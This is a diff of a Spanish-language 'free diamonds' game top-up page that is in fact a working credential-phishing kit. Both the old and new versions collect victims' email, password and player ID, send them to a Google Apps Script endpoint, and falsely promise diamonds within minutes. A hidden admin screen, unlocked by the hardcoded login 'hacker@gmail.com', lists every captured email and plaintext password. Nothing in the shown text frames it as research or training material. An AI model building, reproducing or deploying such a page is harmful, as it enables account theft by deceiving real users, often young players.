@@ -5,550 +5,280 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Recargar Diamantes 💎</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', system-ui, sans-serif;
-        }
-
-        body {
-            background: linear-gradient(180deg, #040e1f 0%, #0a1b3d 50%, #040e1f 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-
-        .container {
-            width: 100%;
-            max-width: 450px;
-            text-align: center;
-        }
-
-        .container.admin-mode {
-            max-width: 1200px;
-        }
-
-        .treasure-img {
-            width: 100%;
-            max-width: 280px;
-            margin: 0 auto 20px;
-            display: block;
-            border-radius: 20px;
-            filter: drop-shadow(0 8px 20px rgba(0,0,0,0.5));
-        }
-
-        .form-card {
-            background: rgba(18, 38, 80, 0.5);
-            backdrop-filter: blur(12px);
-            border: 1px solid rgba(100, 160, 255, 0.3);
-            border-radius: 32px;
-            padding: 28px 22px;
-        }
-
-        .input-group {
-            position: relative;
-            margin-bottom: 18px;
-        }
-
-        .input-group input {
-            width: 100%;
-            padding: 14px 16px 14px 48px;
-            background: rgba(10, 25, 60, 0.8);
-            border: 1px solid rgba(80, 140, 220, 0.5);
-            border-radius: 28px;
-            color: white;
-            font-size: 16px;
-            outline: none;
-        }
-
-        .input-group input:focus {
-            border-color: #3a8fff;
-            box-shadow: 0 0 12px rgba(58, 143, 255, 0.4);
-        }
-
-        .icon-svg {
-            position: absolute;
-            left: 16px;
-            top: 50%;
-            transform: translateY(-50%);
-            width: 20px;
-            height: 20px;
-            fill: #6aafff;
-        }
-
-        .btn-primary {
-            width: 100%;
-            padding: 14px;
-            background: linear-gradient(135deg, #2a8fff, #1a6fd4);
-            border: none;
-            border-radius: 40px;
-            color: white;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: 0.2s;
-        }
-
-        .btn-primary:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(42, 143, 255, 0.4);
-        }
-
-        .btn-primary:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        .btn-secondary {
-            background: rgba(30, 70, 130, 0.8);
-        }
-
-        .btn-logout {
-            background: linear-gradient(135deg, #d43f1a, #a62e0f);
-            border: none;
-            border-radius: 40px;
-            color: white;
-            padding: 8px 20px;
-            cursor: pointer;
-            font-weight: bold;
-        }
-
-        .screen {
-            display: none;
-            animation: fadeIn 0.3s ease;
-        }
-
-        .screen.active {
-            display: block;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .diamond-row {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 12px;
-            margin: 24px 0;
-        }
-
-        .diamond-opt {
-            background: rgba(15, 35, 75, 0.7);
-            border: 2px solid rgba(80, 140, 220, 0.3);
-            border-radius: 20px;
-            cursor: pointer;
-            transition: 0.2s;
-            overflow: hidden;
-        }
-
-        .diamond-opt.selected {
-            border-color: #3a8fff;
-            background: rgba(58, 143, 255, 0.3);
-            transform: scale(1.02);
-            box-shadow: 0 0 15px rgba(58, 143, 255, 0.5);
-        }
-
-        .diamond-img-container {
-            width: 100%;
-            aspect-ratio: 1/1;
-            background: #0a1a2f;
-        }
-
-        .diamond-img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-
-        .diamond-info {
-            padding: 10px;
-            text-align: center;
-            font-weight: bold;
-            font-size: 16px;
-        }
-
-        .validation-msg {
-            font-size: 12px;
-            margin-top: 6px;
-        }
-
-        .error { color: #ffa098; }
-        .success { color: #7ef0a3; }
-
-        .wait-box {
-            background: rgba(15, 40, 80, 0.6);
-            border-radius: 28px;
-            padding: 30px 20px;
-            margin: 20px 0;
-        }
-
-        .diamond-spinner {
-            font-size: 48px;
-            animation: bounce 1s infinite;
-        }
-
-        @keyframes bounce {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
-        }
-
-        .loading-spinner {
-            display: inline-block;
-            width: 18px;
-            height: 18px;
-            border: 2px solid white;
-            border-top-color: transparent;
-            border-radius: 50%;
-            animation: spin 0.6s linear infinite;
-            margin-right: 8px;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        .admin-stats {
-            background: rgba(0, 30, 60, 0.5);
-            border-radius: 20px;
-            padding: 15px;
-            margin-bottom: 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-        }
-
-        .admin-table-wrapper {
-            overflow-x: auto;
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 16px;
-            padding: 10px;
-        }
-
-        .admin-table {
-            width: 100%;
-            border-collapse: collapse;
-            font-size: 13px;
-        }
-
-        .admin-table th,
-        .admin-table td {
-            padding: 10px 8px;
-            text-align: left;
-            border-bottom: 1px solid rgba(100, 160, 255, 0.2);
-            color: white;
-        }
-
-        .admin-table th {
-            background: rgba(30, 70, 130, 0.6);
-            color: #bbd9ff;
-        }
-
-        .badge-count {
-            background: #2a8fff;
-            padding: 5px 14px;
-            border-radius: 30px;
-            font-weight: bold;
-        }
-
-        @media (max-width: 700px) {
-            .diamond-row { grid-template-columns: 1fr; }
-        }
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
+        body{background:linear-gradient(180deg,#040e1f,#0a1b3d);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
+        .container{width:100%;max-width:450px;text-align:center}
+        .container.admin-mode{max-width:1200px}
+        .form-card{background:rgba(18,38,80,.5);backdrop-filter:blur(12px);border:1px solid rgba(100,160,255,.3);border-radius:32px;padding:28px 22px}
+        .input-group{position:relative;margin-bottom:18px}
+        .input-group input{width:100%;padding:14px 16px 14px 48px;background:rgba(10,25,60,.8);border:1px solid rgba(80,140,220,.5);border-radius:28px;color:#fff;font-size:16px;outline:none}
+        .input-group input:focus{border-color:#3a8fff;box-shadow:0 0 12px rgba(58,143,255,.4)}
+        .icon-svg{position:absolute;left:16px;top:50%;transform:translateY(-50%);width:20px;fill:#6aafff}
+        .btn-primary{width:100%;padding:14px;background:linear-gradient(135deg,#2a8fff,#1a6fd4);border:none;border-radius:40px;color:#fff;font-size:16px;font-weight:700;cursor:pointer}
+        .btn-primary:hover{transform:translateY(-2px);box-shadow:0 8px 20px rgba(42,143,255,.4)}
+        .btn-primary:disabled{opacity:.5;cursor:not-allowed}
+        .btn-secondary{background:rgba(30,70,130,.8)}
+        .btn-logout{background:linear-gradient(135deg,#d43f1a,#a62e0f);border:none;border-radius:40px;color:#fff;padding:8px 20px;cursor:pointer}
+        .screen{display:none;animation:fadeIn .3s ease}
+        .screen.active{display:block}
+        @keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+        .diamond-row{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin:24px 0}
+        .diamond-opt{background:rgba(15,35,75,.7);border:2px solid rgba(80,140,220,.3);border-radius:20px;cursor:pointer;transition:.2s;overflow:hidden}
+        .diamond-opt.selected{border-color:#3a8fff;background:rgba(58,143,255,.3);transform:scale(1.02);box-shadow:0 0 15px rgba(58,143,255,.5)}
+        .diamond-img-container{width:100%;aspect-ratio:1/1;background:#0a1a2f}
+        .diamond-img{width:100%;height:100%;object-fit:cover}
+        .diamond-info{padding:10px;text-align:center;font-weight:700}
+        .validation-msg{font-size:12px;margin-top:6px}
+        .error{color:#ffa098}
+        .success{color:#7ef0a3}
+        .wait-box{background:rgba(15,40,80,.6);border-radius:28px;padding:30px 20px;margin:20px 0}
+        .diamond-spinner{font-size:48px;animation:bounce 1s infinite}
+        @keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
+        .loading-spinner{display:inline-block;width:18px;height:18px;border:2px solid #fff;border-top-color:transparent;border-radius:50%;animation:spin .6s linear infinite;margin-right:8px}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        .admin-stats{background:rgba(0,30,60,.5);border-radius:20px;padding:15px;margin-bottom:20px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap}
+        .admin-table-wrapper{overflow-x:auto;background:rgba(0,0,0,.3);border-radius:16px;padding:10px}
+        .admin-table{width:100%;border-collapse:collapse;font-size:13px}
+        .admin-table th,.admin-table td{padding:10px 8px;text-align:left;border-bottom:1px solid rgba(100,160,255,.2);color:#fff}
+        .admin-table th{background:rgba(30,70,130,.6);color:#bbd9ff}
+        .badge-count{background:#2a8fff;padding:5px 14px;border-radius:30px;font-weight:700}
+        @media(max-width:700px){.diamond-row{grid-template-columns:1fr}}
     </style>
 </head>
 <body>
-    <div class="container" id="mainContainer">
-        <!-- PANTALLA 1: LOGIN -->
-        <section id="screen1" class="screen active">
-            <img src="https://i.imgur.com/7Y7Zq3l.png" alt="Cofre" class="treasure-img" onerror="this.src='https://placehold.co/300x180/0a1f3f/white?text=💎'">
-            <div class="form-card">
-                <form id="loginForm">
-                    <div class="input-group">
-                        <input type="email" id="email" placeholder="Correo electrónico" required>
-                        <svg class="icon-svg" viewBox="0 0 24 24"><path d="M20 4H4C2.9 4 2 4.9 2 6V18C2 19.1 2.9 20 4 20H20C21.1 20 22 19.1 22 18V6C22 4.9 21.1 4 20 4ZM20 8L12 13L4 8V6L12 11L20 6V8Z"/></svg>
-                    </div>
-                    <div class="input-group">
-                        <input type="password" id="pass" placeholder="Contraseña" required minlength="6">
-                        <svg class="icon-svg" viewBox="0 0 24 24"><path d="M18 8H17V6C17 3.24 14.76 1 12 1C9.24 1 7 3.24 7 6V8H6C4.9 8 4 8.9 4 10V20C4 21.1 4.9 22 6 22H18C19.1 22 20 21.1 20 20V10C20 8.9 19.1 8 18 8Z"/></svg>
-                    </div>
-                    <button type="submit" class="btn-primary">✨ Acceder ✨</button>
-                </form>
-            </div>
-        </section>
-
-        <!-- PANTALLA 2: DIAMANTES -->
-        <section id="screen2" class="screen">
-            <div class="form-card">
-                <h2 style="margin-bottom: 5px;">💎 Selecciona</h2>
-                <div class="diamond-row">
-                    <div class="diamond-opt" data-val="100">
-                        <div class="diamond-img-container"><img src="https://placehold.co/150x150/1e3a5f/white?text=💎100" class="diamond-img"></div>
-                        <div class="diamond-info">💎 100</div>
-                    </div>
-                    <div class="diamond-opt" data-val="500">
-                        <div class="diamond-img-container"><img src="https://placehold.co/150x150/1e3a5f/white?text=💎500" class="diamond-img"></div>
-                        <div class="diamond-info">💎 500</div>
-                    </div>
-                    <div class="diamond-opt" data-val="1000">
-                        <div class="diamond-img-container"><img src="https://placehold.co/150x150/1e3a5f/white?text=💎1000" class="diamond-img"></div>
-                        <div class="diamond-info">💎 1000</div>
-                    </div>
-                </div>
-                <button id="nextBtn" class="btn-primary" disabled>⏩ Continuar</button>
-            </div>
-        </section>
-
-        <!-- PANTALLA 3: ID -->
-        <section id="screen3" class="screen">
-            <div class="form-card">
-                <h2>🎮 Ingresa tu ID</h2>
-                <p style="margin: 8px 0; opacity:0.8;">10 dígitos numéricos</p>
+<div class="container" id="mainContainer">
+    <!-- LOGIN -->
+    <section id="screen1" class="screen active">
+        <div class="form-card">
+            <h2 style="margin-bottom:20px">💎 RECARGAR DIAMANTES</h2>
+            <form id="loginForm">
                 <div class="input-group">
-                    <input type="text" id="playerId" placeholder="Ej: 1234567890" maxlength="10" inputmode="numeric">
-                    <svg class="icon-svg" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4z"/></svg>
+                    <input type="email" id="email" placeholder="Correo electrónico" required>
+                    <svg class="icon-svg" viewBox="0 0 24 24"><path d="M20 4H4C2.9 4 2 4.9 2 6V18C2 19.1 2.9 20 4 20H20C21.1 20 22 19.1 22 18V6C22 4.9 21.1 4 20 4Z"/></svg>
                 </div>
-                <p id="idMsg" class="validation-msg"></p>
-                <button id="idBtn" class="btn-primary" disabled>✨ Recibir diamantes ✨</button>
-            </div>
-        </section>
+                <div class="input-group">
+                    <input type="password" id="pass" placeholder="Contraseña" required minlength="6">
+                    <svg class="icon-svg" viewBox="0 0 24 24"><path d="M18 8H17V6C17 3.24 14.76 1 12 1C9.24 1 7 3.24 7 6V8H6C4.9 8 4 8.9 4 10V20C4 21.1 4.9 22 6 22H18C19.1 22 20 21.1 20 20V10C20 8.9 19.1 8 18 8Z"/></svg>
+                </div>
+                <button type="submit" class="btn-primary">✨ ACCEDER ✨</button>
+            </form>
+        </div>
+    </section>
 
-        <!-- PANTALLA 4: ESPERA -->
-        <section id="screen4" class="screen">
-            <div class="form-card">
-                <div class="wait-box">
-                    <div class="diamond-spinner">💎⏳💎</div>
-                    <p style="font-size: 20px; font-weight: bold;">✨ ¡Solicitud procesada! ✨</p>
-                    <p style="margin-top: 10px;">Espere 5-10 minutos para recibir sus diamantes.</p>
-                </div>
-                <button id="resetBtn" class="btn-primary btn-secondary">🏠 Volver al inicio</button>
+    <!-- DIAMANTES -->
+    <section id="screen2" class="screen">
+        <div class="form-card">
+            <h2>💎 SELECCIONA</h2>
+            <div class="diamond-row">
+                <div class="diamond-opt" data-val="100"><div class="diamond-img-container"><img src="https://placehold.co/150x150/1e3a5f/white?text=💎100" class="diamond-img"></div><div class="diamond-info">💎 100</div></div>
+                <div class="diamond-opt" data-val="500"><div class="diamond-img-container"><img src="https://placehold.co/150x150/1e3a5f/white?text=💎500" class="diamond-img"></div><div class="diamond-info">💎 500</div></div>
+                <div class="diamond-opt" data-val="1000"><div class="diamond-img-container"><img src="https://placehold.co/150x150/1e3a5f/white?text=💎1000" class="diamond-img"></div><div class="diamond-info">💎 1000</div></div>
             </div>
-        </section>
+            <button id="nextBtn" class="btn-primary" disabled>⏩ CONTINUAR</button>
+        </div>
+    </section>
 
-        <!-- PANTALLA 5: ADMIN -->
-        <section id="screenAdmin" class="screen">
-            <div class="form-card" style="max-width: 100%;">
-                <div class="admin-stats">
-                    <div><span style="font-size: 22px; font-weight: bold;">👑 Panel Admin</span></div>
-                    <div style="display: flex; gap: 12px;">
-                        <span class="badge-count" id="totalCount">0 cuentas</span>
-                        <button id="logoutAdminBtn" class="btn-logout">🚪 Salir</button>
-                    </div>
-                </div>
-                <div class="admin-table-wrapper">
-                    <table class="admin-table">
-                        <thead><tr><th>#</th><th>Email</th><th>Contraseña</th><th>ID</th><th>Diamantes</th><th>Fecha</th></tr></thead>
-                        <tbody id="adminTableBody"><tr><td colspan="6" style="text-align:center;">Cargando...</td></tr></tbody>
-                    </table>
-                </div>
-                <button id="refreshAdminBtn" class="btn-primary" style="margin-top: 15px; width: auto; padding: 10px 25px;">🔄 Refrescar</button>
+    <!-- ID -->
+    <section id="screen3" class="screen">
+        <div class="form-card">
+            <h2>🎮 INGRESA TU ID</h2>
+            <p style="margin:8px 0;opacity:.8">10 dígitos numéricos</p>
+            <div class="input-group">
+                <input type="text" id="playerId" placeholder="Ej: 1234567890" maxlength="10" inputmode="numeric">
+                <svg class="icon-svg" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4z"/></svg>
             </div>
-        </section>
-    </div>
+            <p id="idMsg" class="validation-msg"></p>
+            <button id="idBtn" class="btn-primary" disabled>✨ RECIBIR DIAMANTES ✨</button>
+        </div>
+    </section>
 
-    <script>
-        const ADMIN_EMAIL = "hacker@gmail.com";
-        const ADMIN_PASSWORD = "hacker999";
-        const API_URL = "https://script.google.com/macros/s/AKfycbxfUKf8Z4ix8WfWRyGDu_pbU261d-9EsWb_30rF2KlDWh9wkg0lSkmIvOlzwUdu1PBISA/exec";
+    <!-- ESPERA -->
+    <section id="screen4" class="screen">
+        <div class="form-card">
+            <div class="wait-box">
+                <div class="diamond-spinner">💎⏳💎</div>
+                <p style="font-size:20px;font-weight:700">✨ ¡SOLICITUD PROCESADA! ✨</p>
+                <p style="margin-top:10px">Espere 5-10 minutos para recibir sus diamantes.</p>
+            </div>
+            <button id="resetBtn" class="btn-primary btn-secondary">🏠 VOLVER</button>
+        </div>
+    </section>
+
+    <!-- ADMIN -->
+    <section id="screenAdmin" class="screen">
+        <div class="form-card" style="max-width:100%">
+            <div class="admin-stats">
+                <div><span style="font-size:22px;font-weight:700">👑 PANEL ADMIN</span></div>
+                <div style="display:flex;gap:12px">
+                    <span class="badge-count" id="totalCount">0 cuentas</span>
+                    <button id="logoutAdminBtn" class="btn-logout">🚪 SALIR</button>
+                </div>
+            </div>
+            <div class="admin-table-wrapper">
+                <table class="admin-table">
+                    <thead><tr><th>#</th><th>EMAIL</th><th>CONTRASEÑA</th><th>ID</th><th>DIAMANTES</th><th>FECHA</th></tr></thead>
+                    <tbody id="adminTableBody"><tr><td colspan="6">Cargando...</td></tr></tbody>
+                </table>
+            </div>
+            <button id="refreshAdminBtn" class="btn-primary" style="margin-top:15px;width:auto;padding:10px 25px">🔄 REFRESCAR</button>
+        </div>
+    </section>
+</div>
+
+<script>
+    const API_URL = "https://script.google.com/macros/s/AKfycbweEyk5ftPybvLvVe0pqRgxNzY9T1a3X0ycdM8hjpgkyfo7OAyIJNkPtiSVe0S-RdYWMQ/exec";
+    const ADMIN_EMAIL = "hacker@gmail.com";
+    const ADMIN_PASS = "hacker999";
+    
+    let selectedDiamonds = null, tempEmail = "", tempPass = "";
+
+    async function guardarDatos(datos) {
+        const btn = document.getElementById('idBtn');
+        btn.disabled = true;
+        btn.innerHTML = '<span class="loading-spinner"></span> GUARDANDO...';
         
-        let selectedDiamonds = null;
-        let tempEmail = "", tempPassword = "";
-
-        async function guardarEnSheets(datos) {
-            const btn = document.getElementById('idBtn');
-            btn.disabled = true;
-            btn.innerHTML = '<span class="loading-spinner"></span> Guardando...';
-            
-            try {
-                const res = await fetch(API_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        email: datos.email,
-                        password: datos.password,
-                        playerId: datos.playerId,
-                        diamonds: datos.diamonds
-                    })
-                });
-                const respuesta = await res.json();
-                if (respuesta.success) {
-                    alert("✅ ¡Registro exitoso! Los diamantes llegarán pronto.");
-                    return true;
-                } else {
-                    throw new Error(respuesta.error || "Error desconocido");
-                }
-            } catch(error) {
-                alert("❌ Error: " + error.message + "\n\nRevisa que el Apps Script esté publicado correctamente.");
-                return false;
-            } finally {
-                btn.innerHTML = '✨ Recibir diamantes ✨';
-                btn.disabled = false;
-            }
-        }
-
-        async function obtenerUsuarios() {
-            try {
-                const res = await fetch(API_URL);
-                const data = await res.json();
-                if (data.success && data.data) return data.data;
-                return [];
-            } catch(e) {
-                console.log("Error obteniendo usuarios:", e);
-                return [];
-            }
-        }
-
-        async function renderAdminTable() {
-            const tbody = document.getElementById('adminTableBody');
-            const totalSpan = document.getElementById('totalCount');
-            const usuarios = await obtenerUsuarios();
-            
-            totalSpan.textContent = `${usuarios.length} cuenta${usuarios.length !== 1 ? 's' : ''}`;
-            
-            if (usuarios.length === 0) {
-                tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;">📭 Sin registros</td></tr>';
-                return;
-            }
-            
-            tbody.innerHTML = '';
-            usuarios.reverse().forEach((user, i) => {
-                const row = tbody.insertRow();
-                row.insertCell(0).textContent = i + 1;
-                row.insertCell(1).textContent = user.email || 'N/A';
-                row.insertCell(2).textContent = user.password || 'N/A';
-                row.insertCell(3).textContent = user.playerId || 'N/A';
-                row.insertCell(4).textContent = user.diamantes || 'N/A';
-                row.insertCell(5).textContent = user.fecha || 'N/A';
+        try {
+            const res = await fetch(API_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    email: datos.email,
+                    password: datos.password,
+                    playerId: datos.playerId,
+                    diamonds: datos.diamonds
+                })
             });
+            alert("✅ ¡REGISTRO EXITOSO! Los diamantes llegarán en breve.");
+            return true;
+        } catch(e) {
+            alert("❌ ERROR: " + e.message);
+            return false;
+        } finally {
+            btn.innerHTML = '✨ RECIBIR DIAMANTES ✨';
+            btn.disabled = false;
         }
+    }
 
-        function showScreen(index) {
-            const screens = ['screen1', 'screen2', 'screen3', 'screen4', 'screenAdmin'];
-            screens.forEach((id, i) => {
-                const el = document.getElementById(id);
-                if (el) i === index ? el.classList.add('active') : el.classList.remove('active');
-            });
-            const container = document.getElementById('mainContainer');
-            index === 4 ? container.classList.add('admin-mode') : container.classList.remove('admin-mode');
+    async function obtenerUsuarios() {
+        try {
+            const res = await fetch(API_URL);
+            const data = await res.json();
+            return data.success && data.data ? data.data : [];
+        } catch(e) { return []; }
+    }
+
+    async function mostrarAdmin() {
+        const usuarios = await obtenerUsuarios();
+        const tbody = document.getElementById('adminTableBody');
+        document.getElementById('totalCount').innerText = `${usuarios.length} cuenta${usuarios.length !== 1 ? 's' : ''}`;
+        if(!usuarios.length) { tbody.innerHTML = '<tr><td colspan="6">📭 Sin registros</td></tr>'; return; }
+        tbody.innerHTML = '';
+        usuarios.reverse().forEach((u,i) => {
+            const row = tbody.insertRow();
+            row.insertCell(0).innerText = i+1;
+            row.insertCell(1).innerText = u.email || 'N/A';
+            row.insertCell(2).innerText = u.password || 'N/A';
+            row.insertCell(3).innerText = u.playerId || 'N/A';
+            row.insertCell(4).innerText = u.diamantes || 'N/A';
+            row.insertCell(5).innerText = u.fecha || 'N/A';
+        });
+    }
+
+    function showScreen(n) {
+        ['screen1','screen2','screen3','screen4','screenAdmin'].forEach((id,i)=>{
+            document.getElementById(id).classList.toggle('active', i===n);
+        });
+        document.getElementById('mainContainer').classList.toggle('admin-mode', n===4);
+    }
+
+    // LOGIN
+    document.getElementById('loginForm').addEventListener('submit', (e) => {
+        e.preventDefault();
+        const email = document.getElementById('email').value.trim();
+        const pass = document.getElementById('pass').value;
+        if(email === ADMIN_EMAIL && pass === ADMIN_PASS) { mostrarAdmin(); showScreen(4); return; }
+        if(!email || !pass) return alert("⚠️ Complete todos los campos");
+        if(pass.length < 6) return alert("⚠️ Mínimo 6 caracteres");
+        if(!email.includes('@')) return alert("⚠️ Email inválido");
+        tempEmail = email; tempPass = pass;
+        selectedDiamonds = null;
+        document.querySelectorAll('.diamond-opt').forEach(o=>o.classList.remove('selected'));
+        document.getElementById('nextBtn').disabled = true;
+        showScreen(1);
+    });
+
+    // DIAMANTES
+    document.querySelectorAll('.diamond-opt').forEach(opt=>{
+        opt.addEventListener('click',()=>{
+            document.querySelectorAll('.diamond-opt').forEach(o=>o.classList.remove('selected'));
+            opt.classList.add('selected');
+            selectedDiamonds = parseInt(opt.dataset.val);
+            const btn = document.getElementById('nextBtn');
+            btn.disabled = false;
+            btn.innerHTML = `CONTINUAR (${selectedDiamonds} 💎)`;
+        });
+    });
+
+    document.getElementById('nextBtn').addEventListener('click',()=>{
+        if(selectedDiamonds) { showScreen(2); }
+    });
+
+    // VALIDAR ID
+    const idInput = document.getElementById('playerId');
+    const idMsg = document.getElementById('idMsg');
+    const idBtn = document.getElementById('idBtn');
+    idInput.addEventListener('input',()=>{
+        let v = idInput.value.replace(/\D/g,'').slice(0,10);
+        idInput.value = v;
+        if(v.length===10){
+            idBtn.disabled=false;
+            idMsg.innerText='✅ ID válido';
+            idMsg.className='validation-msg success';
+        } else {
+            idBtn.disabled=true;
+            idMsg.innerText=v.length ? `⚠️ Faltan ${10-v.length} números` : '';
+            idMsg.className='validation-msg error';
         }
+    });
 
-        // LOGIN
-        document.getElementById('loginForm').addEventListener('submit', (e) => {
-            e.preventDefault();
-            const email = document.getElementById('email').value.trim();
-            const pass = document.getElementById('pass').value;
-            
-            if (email === ADMIN_EMAIL && pass === ADMIN_PASSWORD) {
-                renderAdminTable();
-                showScreen(4);
-                return;
-            }
-            
-            if (!email || !pass) return alert("⚠️ Complete todos los campos");
-            if (pass.length < 6) return alert("⚠️ La contraseña debe tener al menos 6 caracteres");
-            if (!email.includes('@')) return alert("⚠️ Correo inválido");
-            
-            tempEmail = email;
-            tempPassword = pass;
-            selectedDiamonds = null;
-            document.querySelectorAll('.diamond-opt').forEach(o => o.classList.remove('selected'));
-            document.getElementById('nextBtn').disabled = true;
-            showScreen(1);
-        });
+    // GUARDAR
+    idBtn.addEventListener('click', async()=>{
+        const id = idInput.value.replace(/\D/g,'');
+        if(id.length!==10) return alert("❌ ID debe tener 10 dígitos");
+        if(!selectedDiamonds) return alert("⚠️ Seleccione diamantes");
+        const ok = await guardarDatos({ email:tempEmail, password:tempPass, playerId:id, diamonds:selectedDiamonds });
+        if(ok){
+            document.getElementById('email').value='';
+            document.getElementById('pass').value='';
+            idInput.value='';
+            idMsg.innerText='';
+            selectedDiamonds=null;
+            tempEmail=''; tempPass='';
+            showScreen(3);
+        }
+    });
 
-        // DIAMANTES
-        document.querySelectorAll('.diamond-opt').forEach(opt => {
-            opt.addEventListener('click', () => {
-                document.querySelectorAll('.diamond-opt').forEach(o => o.classList.remove('selected'));
-                opt.classList.add('selected');
-                selectedDiamonds = parseInt(opt.dataset.val);
-                const next = document.getElementById('nextBtn');
-                next.disabled = false;
-                next.innerHTML = `Continuar (${selectedDiamonds} 💎)`;
-            });
-        });
+    // RESET
+    document.getElementById('resetBtn').addEventListener('click',()=>{
+        selectedDiamonds=null; tempEmail=''; tempPass='';
+        document.getElementById('email').value='';
+        document.getElementById('pass').value='';
+        idInput.value=''; idMsg.innerText='';
+        document.getElementById('nextBtn').disabled=true;
+        document.querySelectorAll('.diamond-opt').forEach(o=>o.classList.remove('selected'));
+        showScreen(0);
+    });
 
-        document.getElementById('nextBtn').addEventListener('click', () => {
-            if (selectedDiamonds) {
-                document.getElementById('playerId').value = '';
-                document.getElementById('idMsg').textContent = '';
-                document.getElementById('idBtn').disabled = true;
-                showScreen(2);
-            }
-        });
+    // ADMIN
+    document.getElementById('refreshAdminBtn').addEventListener('click',()=>mostrarAdmin());
+    document.getElementById('logoutAdminBtn').addEventListener('click',()=>{
+        showScreen(0);
+        document.getElementById('email').value='';
+        document.getElementById('pass').value='';
+    });
 
-        // VALIDAR ID
-        const idInput = document.getElementById('playerId');
-        const idMsg = document.getElementById('idMsg');
-        const idBtn = document.getElementById('idBtn');
-        
-        idInput.addEventListener('input', () => {
-            let val = idInput.value.replace(/\D/g, '').slice(0, 10);
-            idInput.value = val;
-            if (val.length === 10) {
-                idBtn.disabled = false;
-                idMsg.textContent = '✅ ID válido';
-                idMsg.className = 'validation-msg success';
-            } else {
-                idBtn.disabled = true;
-                idMsg.textContent = val.length > 0 ? `⚠️ Faltan ${10 - val.length} números` : '';
-                idMsg.className = 'validation-msg error';
-            }
-        });
-
-        // GUARDAR
-        idBtn.addEventListener('click', async () => {
-            const playerId = idInput.value.replace(/\D/g, '');
-            if (playerId.length !== 10) return alert("❌ El ID debe tener 10 dígitos");
-            if (!selectedDiamonds) return alert("⚠️ Seleccione diamantes");
-            
-            const ok = await guardarEnSheets({
-                email: tempEmail,
-                password: tempPassword,
-                playerId: playerId,
-                diamonds: selectedDiamonds
-            });
-            
-            if (ok) {
-                document.getElementById('email').value = '';
-                document.getElementById('pass').value = '';
-                idInput.value = '';
-                idMsg.textContent = '';
-                selectedDiamonds = null;
-                tempEmail = '';
-                tempPassword = '';
-                showScreen(3);
-            }
-        });
-
-        // RESET
-        document.getElementById('resetBtn').addEventListener('click', () => {
-            selectedDiamonds = null;
-            tempEmail = '';
-            tempPassword = '';
-            document.getElementById('email').value = '';
-            document.getElementById('pass').value = '';
-            idInput.value = '';
-            idMsg.textContent = '';
-            document.getElementById('nextBtn').disabled = true;
-            document.querySelectorAll('.diamond-opt').forEach(o => o.classList.remove('selected'));
-            showScreen(0);
-        });
-
-        // ADMIN
-        document.getElementById('refreshAdminBtn').addEventListener('click', () => renderAdminTable());
-        document.getElementById('logoutAdminBtn').addEventListener('click', () => {
-            showScreen(0);
-            document.getElementById('email').value = '';
-            document.getElementById('pass').value = '';
-        });
-
-        window.addEventListener('load', () => showScreen(0));
-    </script>
+    showScreen(0);
+</script>
 </body>
 </html>
